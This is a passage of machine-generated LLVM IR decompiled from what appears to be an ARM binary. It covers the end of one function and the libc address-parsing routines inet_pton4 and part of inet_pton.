  br i1 %v0_1abe4.pr, label %dec_label_pc_1abf0, label %dec_label_pc_1abb8

dec_label_pc_1abf0:                               ; preds = %bb20
  store i32 0, i32* @r8, align 4
  %v0_1abe82 = load i32, i32* %r6.global-to-local, align 4
  %v1_1abe83 = add i32 %v0_1abe82, 1
  store i32 %v1_1abe83, i32* @r6, align 4
  %v1_1abf0 = inttoptr i32 %v0_1abd4 to i32*
  %v2_1abf0 = load i32, i32* %v1_1abf0, align 4
  %v7_1abf4 = icmp eq i32 %v2_1abf0, 2
  br i1 %v7_1abf4, label %dec_label_pc_1abfc, label %dec_label_pc_1ac18

dec_label_pc_1abfc:                               ; preds = %dec_label_pc_1abf0
  %v0_1abfc = load i32, i32* %sb.global-to-local, align 4
  %v1_1abfc = inttoptr i32 %v0_1abfc to i32*
  %v2_1abfc = load i32, i32* %v1_1abfc, align 4
  store i32 %v2_1abfc, i32* @r0, align 4
  %v0_1ac00 = call i32 @free()
  store i32 %v0_1ac00, i32* %r0.global-to-local, align 4
  %v0_1ac04 = load i32, i32* @r8, align 4
  %v1_1ac04 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ac04 = inttoptr i32 %v1_1ac04 to i32*
  store i32 %v0_1ac04, i32* %v2_1ac04, align 4
  %v0_1ac18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac18

dec_label_pc_1ac0c:                               ; preds = %dec_label_pc_1ab38, %entry
  br label %dec_label_pc_1ac18

dec_label_pc_1ac14:                               ; preds = %dec_label_pc_1ab58, %dec_label_pc_1ab64
  br label %dec_label_pc_1ac18

dec_label_pc_1ac18:                               ; preds = %dec_label_pc_1abf0, %dec_label_pc_1ac0c, %dec_label_pc_1abfc, %dec_label_pc_1ab88, %dec_label_pc_1ac14
  %v0_1ac18 = phi i32 [ %storemerge, %dec_label_pc_1abf0 ], [ 0, %dec_label_pc_1ac0c ], [ %v0_1ac18.pre, %dec_label_pc_1abfc ], [ %v0_1ab98, %dec_label_pc_1ab88 ], [ 1, %dec_label_pc_1ac14 ]
  store i32 %v0_1ac18, i32* %r0.global-to-local, align 4
  store i32 %v9_1aaec, i32* @r6, align 4
  store i32 %v12_1aaec, i32* @r7, align 4
  store i32 %v15_1aaec, i32* @r8, align 4
  store i32 %v21_1aaec, i32* @sl, align 4
  ret i32 %v0_1ac18

; uselistorder directives
  uselistorder i32 %v0_1ac18, { 1, 0 }
  uselistorder i32 %v1_1ab74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1ab18, { 2, 3, 0, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 3, 0, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 3, 2, 5, 7, 6, 8, 0, 9 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ac18, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1ac14, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1abc8, { 1, 0 }
  uselistorder label %dec_label_pc_1abac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ab44, { 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_1ac28 = load i32, i32* @r5, align 4
  %v2_1ac30 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_1ac30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_1acb83 = load i8, i8* %arg1, align 1
  %v3_1acb84 = zext i8 %v2_1acb83 to i32
  %v5_1acb85 = add i32 %tmp, 1
  store i32 %v5_1acb85, i32* @r4, align 4
  %v2_1acbc6 = icmp eq i8 %v2_1acb83, 0
  store i1 %v2_1acbc6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1acbc6, label %dec_label_pc_1acc8, label %dec_label_pc_1ac50

dec_label_pc_1ac50:                               ; preds = %entry, %dec_label_pc_1acb8.backedge
  %v0_1ac94 = phi i32 [ %v3_1acb8, %dec_label_pc_1acb8.backedge ], [ %v3_1acb84, %entry ]
  %v1_1acc010.in = phi i32 [ %v3_1acb8, %dec_label_pc_1acb8.backedge ], [ %v3_1acb84, %entry ]
  %v1_1acc010 = add nsw i32 %v1_1acc010.in, -48
  %v2_1ac50 = icmp ugt i32 %v1_1acc010, 8
  %v7_1ac50 = icmp eq i32 %v1_1acc010, 9
  store i1 %v7_1ac50, i1* %cpsr_z.global-to-local, align 1
  %v2_1ac58 = xor i1 %v7_1ac50, true
  %v3_1ac58 = and i1 %v2_1ac50, %v2_1ac58
  br i1 %v3_1ac58, label %dec_label_pc_1ac94, label %dec_label_pc_1ac5c

dec_label_pc_1ac5c:                               ; preds = %dec_label_pc_1ac50
  %v0_1ac5c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ac5c = inttoptr i32 %v0_1ac5c to i8*
  %v2_1ac5c = load i8, i8* %v1_1ac5c, align 1
  %v3_1ac5c = zext i8 %v2_1ac5c to i32
  %v3_1ac64 = mul nuw nsw i32 %v3_1ac5c, 10
  %v4_1ac64 = add nuw nsw i32 %v3_1ac64, %v0_1ac94
  %v1_1ac68 = add nsw i32 %v4_1ac64, -48
  %v2_1ac6c = icmp ugt i32 %v1_1ac68, 254
  %v7_1ac6c = icmp eq i32 %v1_1ac68, 255
  store i1 %v7_1ac6c, i1* %cpsr_z.global-to-local, align 1
  %v2_1ac70 = xor i1 %v7_1ac6c, true
  %v3_1ac70 = and i1 %v2_1ac6c, %v2_1ac70
  br i1 %v3_1ac70, label %dec_label_pc_1acec, label %dec_label_pc_1ac74

dec_label_pc_1ac74:                               ; preds = %dec_label_pc_1ac5c
  %v0_1ac74 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ac74 = icmp eq i32 %v0_1ac74, 0
  store i1 %v2_1ac74, i1* %cpsr_z.global-to-local, align 1
  %v1_1ac78 = trunc i32 %v1_1ac68 to i8
  store i8 %v1_1ac78, i8* %v1_1ac5c, align 1
  %v0_1ac7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ac7c, label %dec_label_pc_1ac80, label %dec_label_pc_1acb8.backedge

dec_label_pc_1ac80:                               ; preds = %dec_label_pc_1ac74
  %v0_1ac80 = load i32, i32* @lr, align 4
  %v1_1ac80 = add i32 %v0_1ac80, 1
  store i32 %v1_1ac80, i32* @lr, align 4
  %v7_1ac84 = icmp eq i32 %v1_1ac80, 4
  store i1 %v7_1ac84, i1* %cpsr_z.global-to-local, align 1
  %v0_1ac88 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ac88 = add i32 %v0_1ac88, 1
  store i32 %v1_1ac88, i32* %r1.global-to-local, align 4
  %v8_1ac8c = icmp sgt i32 %v1_1ac80, 4
  br i1 %v8_1ac8c, label %dec_label_pc_1acec, label %dec_label_pc_1acb8.backedge

dec_label_pc_1ac94:                               ; preds = %dec_label_pc_1ac50
  %v7_1ac94 = icmp eq i32 %v0_1ac94, 46
  store i1 %v7_1ac94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac94, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1ac94
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1acec

bb:                                               ; preds = %dec_label_pc_1ac94
  %v1_1ac9c = load i32, i32* %r1.global-to-local, align 4
  %v2_1ac9c = urem i32 %v1_1ac9c, 2
  %v2_1aca0 = icmp eq i32 %v2_1ac9c, 0
  store i1 %v2_1aca0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_1aca0, label %dec_label_pc_1acec, label %dec_label_pc_1acac

dec_label_pc_1acac:                               ; preds = %bb
  %v0_1acac = load i32, i32* @lr, align 4
  %v7_1acac = icmp eq i32 %v0_1acac, 4
  store i1 %v7_1acac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1acac, label %dec_label_pc_1acec, label %dec_label_pc_1acb4

dec_label_pc_1acb4:                               ; preds = %dec_label_pc_1acac
  %v2_1acb4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1acb4 = add i32 %v2_1acb4, 1
  %v4_1acb4 = inttoptr i32 %v3_1acb4 to i8*
  store i8 0, i8* %v4_1acb4, align 1
  %v5_1acb4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1acb4 = add i32 %v5_1acb4, 1
  store i32 %v6_1acb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acb8.backedge

dec_label_pc_1acb8.backedge:                      ; preds = %dec_label_pc_1acb4, %dec_label_pc_1ac74, %dec_label_pc_1ac80
  %v0_1acb8 = load i32, i32* @r4, align 4
  %v1_1acb8 = inttoptr i32 %v0_1acb8 to i8*
  %v2_1acb8 = load i8, i8* %v1_1acb8, align 1
  %v3_1acb8 = zext i8 %v2_1acb8 to i32
  %v5_1acb8 = add i32 %v0_1acb8, 1
  store i32 %v5_1acb8, i32* @r4, align 4
  %v2_1acbc = icmp eq i8 %v2_1acb8, 0
  store i1 %v2_1acbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1acbc, label %dec_label_pc_1acb8.dec_label_pc_1acc8_crit_edge, label %dec_label_pc_1ac50

dec_label_pc_1acb8.dec_label_pc_1acc8_crit_edge:  ; preds = %dec_label_pc_1acb8.backedge
  %v0_1acc8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1acc8

dec_label_pc_1acc8:                               ; preds = %dec_label_pc_1acb8.dec_label_pc_1acc8_crit_edge, %entry
  %v0_1acc8 = phi i32 [ %v0_1acc8.pre, %dec_label_pc_1acb8.dec_label_pc_1acc8_crit_edge ], [ 0, %entry ]
  %v7_1acc8 = icmp eq i32 %v0_1acc8, 3
  store i1 %v7_1acc8, i1* %cpsr_z.global-to-local, align 1
  %v7_1accc = icmp slt i32 %v0_1acc8, 4
  br i1 %v7_1accc, label %dec_label_pc_1acec, label %dec_label_pc_1acd0

dec_label_pc_1acd0:                               ; preds = %dec_label_pc_1acc8
  %v0_1acd0 = load i32, i32* @r5, align 4
  store i32 %v0_1acd0, i32* @r0, align 4
  store i32 %v2_1ac30, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1acdc = call i32 @memcpy()
  br label %dec_label_pc_1acec

dec_label_pc_1acec:                               ; preds = %dec_label_pc_1ac5c, %dec_label_pc_1ac80, %bb, %dec_label_pc_1acac, %.thread12, %dec_label_pc_1acc8, %dec_label_pc_1acd0
  %storemerge = phi i32 [ 1, %dec_label_pc_1acd0 ], [ 0, %dec_label_pc_1acc8 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1acac ], [ 0, %bb ], [ 0, %dec_label_pc_1ac80 ], [ 0, %dec_label_pc_1ac5c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1ac28, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1acc8, { 1, 0 }
  uselistorder i32 %v3_1acb8, { 1, 0 }
  uselistorder i32 %v0_1ac94, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_1acec, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_1acb8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ac50, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1acf4 = load i32, i32* @r4, align 4
  %v6_1acf4 = load i32, i32* @r5, align 4
  %v9_1acf4 = load i32, i32* @r6, align 4
  %v7_1acf8 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_1acf8, label %dec_label_pc_1ad18, label %dec_label_pc_1ad0c

dec_label_pc_1ad0c:                               ; preds = %entry
  %v7_1ad0c = icmp eq i32 %arg1, 10
  br i1 %v7_1ad0c, label %dec_label_pc_1ad2c, label %dec_label_pc_1aedc

dec_label_pc_1ad18:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1ad20 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_1ad20, i32* %r0.global-to-local, align 4
  store i32 %v4_1ad20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aef4

dec_label_pc_1ad2c:                               ; preds = %dec_label_pc_1ad0c
  %v2_1ad2c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1ad2c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1ad38 = call i32 @__GI_memset()
  store i32 %v0_1ad38, i32* %r0.global-to-local, align 4
  %v0_1ad3c = load i32, i32* @r6, align 4
  %v1_1ad3c = inttoptr i32 %v0_1ad3c to i8*
  %v2_1ad3c = load i8, i8* %v1_1ad3c, align 1
  %v3_1ad3c = zext i8 %v2_1ad3c to i32
  store i32 %v3_1ad3c, i32* %r3.global-to-local, align 4
  %v7_1ad40 = icmp eq i8 %v2_1ad3c, 58
  store i32 %v0_1ad38, i32* @r4, align 4
  %v2_1ad48 = add i32 %v0_1ad38, 16
  store i32 %v2_1ad48, i32* %r8.global-to-local, align 4
  br i1 %v7_1ad40, label %dec_label_pc_1ad50, label %dec_label_pc_1ad5c

dec_label_pc_1ad50:                               ; preds = %dec_label_pc_1ad2c
  %v1_1ad50 = add i32 %v0_1ad3c, 1
  %v2_1ad50 = inttoptr i32 %v1_1ad50 to i8*
  %v3_1ad50 = load i8, i8* %v2_1ad50, align 1
  %v4_1ad50 = zext i8 %v3_1ad50 to i32
  store i32 %v4_1ad50, i32* %r3.global-to-local, align 4
  store i32 %v1_1ad50, i32* @r6, align 4
  %v7_1ad54 = icmp eq i8 %v3_1ad50, 58
  br i1 %v7_1ad54, label %dec_label_pc_1ad5c, label %dec_label_pc_1aef0

dec_label_pc_1ad5c:                               ; preds = %dec_label_pc_1ad50, %dec_label_pc_1ad2c
  %v0_1ad60 = phi i32 [ %v1_1ad50, %dec_label_pc_1ad50 ], [ %v0_1ad3c, %dec_label_pc_1ad2c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_1ad60, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1ae3c7 = inttoptr i32 %v0_1ad60 to i8*
  %v2_1ae3c8 = load i8, i8* %v1_1ae3c7, align 1
  %v3_1ae3c9 = zext i8 %v2_1ae3c8 to i32
  store i32 %v3_1ae3c9, i32* %r0.global-to-local, align 4
  %v1_1ae4010 = call i32 @__GI_tolower(i32 %v3_1ae3c9)
  store i32 %v1_1ae4010, i32* %r0.global-to-local, align 4
  store i32 %v1_1ae4010, i32* @r5, align 4
  %v2_1ae4412 = icmp eq i32 %v1_1ae4010, 0
  br i1 %v2_1ae4412, label %dec_label_pc_1ae4c, label %dec_label_pc_1ad70

dec_label_pc_1ad70:                               ; preds = %dec_label_pc_1ad5c, %dec_label_pc_1ae3c.backedge
  %v0_1ad74 = phi i32 [ %v1_1ae40, %dec_label_pc_1ae3c.backedge ], [ %v1_1ae4010, %dec_label_pc_1ad5c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1ae3c.backedge ], [ 0, %dec_label_pc_1ad5c ]
  store i32 ptrtoint ([17 x i8]* @global_var_1eaf4.1041 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1eaf4.1041 to i32), i32* %r0.global-to-local, align 4
  %v3_1ad7c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1eaf4.1041 to i32), i32 %v0_1ad74)
  %v4_1ad7c = trunc i32 %v3_1ad7c to i8
  store i32 %v3_1ad7c, i32* %r0.global-to-local, align 4
  %v3_1ad80 = icmp eq i8 %v4_1ad7c, 0
  %v0_1ad84 = load i32, i32* @r6, align 4
  %v1_1ad84 = add i32 %v0_1ad84, 1
  store i32 %v1_1ad84, i32* @r6, align 4
  br i1 %v3_1ad80, label %dec_label_pc_1ada0, label %dec_label_pc_1ad8c

dec_label_pc_1ad8c:                               ; preds = %dec_label_pc_1ad70
  %v0_1ad8c = load i32, i32* %sb.global-to-local, align 4
  %v2_1ad8c = sext i8 %v4_1ad7c to i32
  %v3_1ad8c = sub i32 %v2_1ad8c, %v0_1ad8c
  store i32 %v3_1ad8c, i32* %r3.global-to-local, align 4
  %v1_1ad90 = load i32, i32* %r7.global-to-local, align 4
  %v4_1ad90 = mul i32 %v1_1ad90, 16
  %v5_1ad90 = or i32 %v4_1ad90, %v3_1ad8c
  store i32 %v5_1ad90, i32* %r7.global-to-local, align 4
  %v3_1ad98 = icmp ult i32 %v5_1ad90, 65534
  br i1 %v3_1ad98, label %dec_label_pc_1ae34, label %dec_label_pc_1aef0

dec_label_pc_1ada0:                               ; preds = %dec_label_pc_1ad70
  %v0_1ada0 = load i32, i32* @r5, align 4
  %v7_1ada0 = icmp eq i32 %v0_1ada0, 58
  br i1 %v7_1ada0, label %dec_label_pc_1ada8, label %dec_label_pc_1ae04

dec_label_pc_1ada8:                               ; preds = %dec_label_pc_1ada0
  %v4_1ada82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_1ada82, i32* %r3.global-to-local, align 4
  %v2_1adac = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1adac, label %dec_label_pc_1adb4, label %dec_label_pc_1adc8

dec_label_pc_1adb4:                               ; preds = %dec_label_pc_1ada8
  %v0_1adb4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1adb4 = icmp eq i32 %v0_1adb4, 0
  br i1 %v2_1adb4, label %dec_label_pc_1adbc, label %dec_label_pc_1aef0

dec_label_pc_1adbc:                               ; preds = %dec_label_pc_1adb4
  %v0_1adbc = load i32, i32* @r4, align 4
  store i32 %v0_1adbc, i32* %fp.global-to-local, align 4
  store i32 %v1_1ad84, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ae3c.backedge

dec_label_pc_1adc8:                               ; preds = %dec_label_pc_1ada8
  %v1_1adc8 = inttoptr i32 %v1_1ad84 to i8*
  %v2_1adc8 = load i8, i8* %v1_1adc8, align 1
  %v3_1adc8 = zext i8 %v2_1adc8 to i32
  store i32 %v3_1adc8, i32* %r3.global-to-local, align 4
  %v2_1adcc = icmp eq i8 %v2_1adc8, 0
  br i1 %v2_1adcc, label %dec_label_pc_1aef0, label %dec_label_pc_1add4

dec_label_pc_1add4:                               ; preds = %dec_label_pc_1adc8
  %v0_1add4 = load i32, i32* @r4, align 4
  %v1_1add4 = add i32 %v0_1add4, 2
  store i32 %v1_1add4, i32* %r3.global-to-local, align 4
  %v1_1add8 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1add4, %v1_1add8
  br i1 %tmp38, label %dec_label_pc_1aef0, label %dec_label_pc_1ade0

dec_label_pc_1ade0:                               ; preds = %dec_label_pc_1add4
  %v0_1ade0 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ade0 = udiv i32 %v0_1ade0, 256
  store i32 %v3_1ade0, i32* %r2.global-to-local, align 4
  store i32 %v0_1add4, i32* %r3.global-to-local, align 4
  %v1_1ade8 = trunc i32 %v3_1ade0 to i8
  %v3_1ade8 = inttoptr i32 %v0_1add4 to i8*
  store i8 %v1_1ade8, i8* %v3_1ade8, align 1
  %v4_1ade8 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ade8 = add i32 %v4_1ade8, 1
  store i32 %v5_1ade8, i32* %r3.global-to-local, align 4
  %v0_1adec = load i32, i32* @r6, align 4
  store i32 %v0_1adec, i32* %sl.global-to-local, align 4
  %v0_1adf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1adf0 = trunc i32 %v0_1adf0 to i8
  %v2_1adf0 = load i32, i32* @r4, align 4
  %v3_1adf0 = add i32 %v2_1adf0, 1
  %v4_1adf0 = inttoptr i32 %v3_1adf0 to i8*
  store i8 %v1_1adf0, i8* %v4_1adf0, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1adf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1adf8 = add i32 %v0_1adf8, 1
  store i32 %v1_1adf8, i32* @r4, align 4
  %v0_1ae3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1ae3c.backedge

dec_label_pc_1ae04:                               ; preds = %dec_label_pc_1ada0
  %v7_1ae04 = icmp eq i32 %v0_1ada0, 46
  br i1 %v7_1ae04, label %dec_label_pc_1ae0c, label %dec_label_pc_1aef0

dec_label_pc_1ae0c:                               ; preds = %dec_label_pc_1ae04
  %v0_1ae0c = load i32, i32* @r4, align 4
  %v1_1ae0c = add i32 %v0_1ae0c, 4
  store i32 %v1_1ae0c, i32* @r5, align 4
  %v1_1ae10 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1ae0c, %v1_1ae10
  br i1 %tmp39, label %dec_label_pc_1aef0, label %dec_label_pc_1ae18

dec_label_pc_1ae18:                               ; preds = %dec_label_pc_1ae0c
  %v0_1ae1c = load i32, i32* %sl.global-to-local, align 4
  %v1_1ae1c = inttoptr i32 %v0_1ae1c to i8*
  store i32 %v0_1ae1c, i32* %r0.global-to-local, align 4
  %v4_1ae20 = call i32 @inet_pton4(i8* %v1_1ae1c, i32 %v0_1ae0c)
  store i32 %v4_1ae20, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_1ae20, 1
  br i1 %tmp36, label %dec_label_pc_1aef0, label %bb

bb:                                               ; preds = %dec_label_pc_1ae18
  %v5_1ae28 = load i32, i32* @r5, align 4
  store i32 %v5_1ae28, i32* @r4, align 4
  br label %dec_label_pc_1ae78

dec_label_pc_1ae34:                               ; preds = %dec_label_pc_1ad8c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ae3c.backedge

dec_label_pc_1ae3c.backedge:                      ; preds = %dec_label_pc_1ae34, %dec_label_pc_1adbc, %dec_label_pc_1ade0
  %v0_1ae3c = phi i32 [ %v1_1ad84, %dec_label_pc_1adbc ], [ %v0_1ae3c.pre, %dec_label_pc_1ade0 ], [ %v1_1ad84, %dec_label_pc_1ae34 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1adbc ], [ 0, %dec_label_pc_1ade0 ], [ 1, %dec_label_pc_1ae34 ]
  %v1_1ae3c = inttoptr i32 %v0_1ae3c to i8*
  %v2_1ae3c = load i8, i8* %v1_1ae3c, align 1
  %v3_1ae3c = zext i8 %v2_1ae3c to i32
  store i32 %v3_1ae3c, i32* %r0.global-to-local, align 4
  %v1_1ae40 = call i32 @__GI_tolower(i32 %v3_1ae3c)
  store i32 %v1_1ae40, i32* %r0.global-to-local, align 4
  store i32 %v1_1ae40, i32* @r5, align 4
  %v2_1ae44 = icmp eq i32 %v1_1ae40, 0
  br i1 %v2_1ae44, label %dec_label_pc_1ae4c, label %dec_label_pc_1ad70

dec_label_pc_1ae4c:                               ; preds = %dec_label_pc_1ae3c.backedge, %dec_label_pc_1ad5c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1ad5c ], [ %stack_var_-56.0.be, %dec_label_pc_1ae3c.backedge ]
  %v4_1ae4c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1ae4c3, i32* %r3.global-to-local, align 4
  %v2_1ae50 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1aebc.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_1ae50, label %dec_label_pc_1ae78, label %dec_label_pc_1ae58

dec_label_pc_1ae58:                               ; preds = %dec_label_pc_1ae4c
  %v1_1ae58 = add i32 %v0_1aebc.pre.pre, 2
  store i32 %v1_1ae58, i32* %r3.global-to-local, align 4
  %v1_1ae5c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_1ae58, %v1_1ae5c
  br i1 %tmp40, label %dec_label_pc_1aef0, label %dec_label_pc_1ae64

dec_label_pc_1ae64:                               ; preds = %dec_label_pc_1ae58
  store i32 %v0_1aebc.pre.pre, i32* %r3.global-to-local, align 4
  %v0_1ae68 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ae68 = udiv i32 %v0_1ae68, 256
  store i32 %v3_1ae68, i32* %r2.global-to-local, align 4
  %v1_1ae6c = trunc i32 %v3_1ae68 to i8
  %v3_1ae6c = inttoptr i32 %v0_1aebc.pre.pre to i8*
  store i8 %v1_1ae6c, i8* %v3_1ae6c, align 1
  %v4_1ae6c = load i32, i32* %r3.global-to-local, align 4
  %v5_1ae6c = add i32 %v4_1ae6c, 1
  store i32 %v5_1ae6c, i32* %r3.global-to-local, align 4
  %v0_1ae70 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ae70 = trunc i32 %v0_1ae70 to i8
  %v2_1ae70 = load i32, i32* @r4, align 4
  %v3_1ae70 = add i32 %v2_1ae70, 1
  %v4_1ae70 = inttoptr i32 %v3_1ae70 to i8*
  store i8 %v1_1ae70, i8* %v4_1ae70, align 1
  %v0_1ae74 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ae74 = add i32 %v0_1ae74, 1
  store i32 %v1_1ae74, i32* @r4, align 4
  br label %dec_label_pc_1ae78

dec_label_pc_1ae78:                               ; preds = %dec_label_pc_1ae4c, %bb, %dec_label_pc_1ae64
  %v0_1aebc.pre = phi i32 [ %v5_1ae28, %bb ], [ %v1_1ae74, %dec_label_pc_1ae64 ], [ %v0_1aebc.pre.pre, %dec_label_pc_1ae4c ]
  %v0_1ae78 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ae78 = icmp eq i32 %v0_1ae78, 0
  %v1_1aebc.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1ae78, label %dec_label_pc_1aebc, label %dec_label_pc_1ae80

dec_label_pc_1ae80:                               ; preds = %dec_label_pc_1ae78
  %v9_1ae80 = icmp eq i32 %v0_1aebc.pre, %v1_1aebc.pre
  %v2_1ae84 = sub i32 %v0_1aebc.pre, %v0_1ae78
  store i32 %v2_1ae84, i32* %r0.global-to-local, align 4
  br i1 %v9_1ae80, label %dec_label_pc_1aef0, label %dec_label_pc_1aea4.preheader

dec_label_pc_1aea4.preheader:                     ; preds = %dec_label_pc_1ae80
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aea4

dec_label_pc_1ae94:                               ; preds = %dec_label_pc_1aea4
  %v0_1ae94 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ae94 = add i32 %v0_1ae94, %v2_1aea8
  %v3_1ae94 = inttoptr i32 %v2_1ae94 to i8*
  %v4_1ae94 = load i8, i8* %v3_1ae94, align 1
  %v3_1ae98 = inttoptr i32 %v2_1aeac to i8*
  store i8 %v4_1ae94, i8* %v3_1ae98, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1aea0 = load i32, i32* %fp.global-to-local, align 4
  %v3_1aea0 = load i32, i32* %ip.global-to-local, align 4
  %v4_1aea0 = add i32 %v3_1aea0, %v2_1aea0
  %v5_1aea0 = inttoptr i32 %v4_1aea0 to i8*
  store i8 0, i8* %v5_1aea0, align 1
  %v0_1aea4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1aea4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1aeac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1aea4

dec_label_pc_1aea4:                               ; preds = %dec_label_pc_1aea4.preheader, %dec_label_pc_1ae94
  %v0_1aeb8 = phi i32 [ %v1_1aebc.pre, %dec_label_pc_1aea4.preheader ], [ %v1_1aeac.pre, %dec_label_pc_1ae94 ]
  %v1_1aea8 = phi i32 [ %v2_1ae84, %dec_label_pc_1aea4.preheader ], [ %v1_1aea4.pre, %dec_label_pc_1ae94 ]
  %v0_1aeb0 = phi i32 [ 1, %dec_label_pc_1aea4.preheader ], [ %v0_1aea4.pre, %dec_label_pc_1ae94 ]
  %v2_1aea8 = sub i32 %v1_1aea8, %v0_1aeb0
  store i32 %v2_1aea8, i32* %ip.global-to-local, align 4
  %v2_1aeac = sub i32 %v0_1aeb8, %v0_1aeb0
  store i32 %v2_1aeac, i32* @lr, align 4
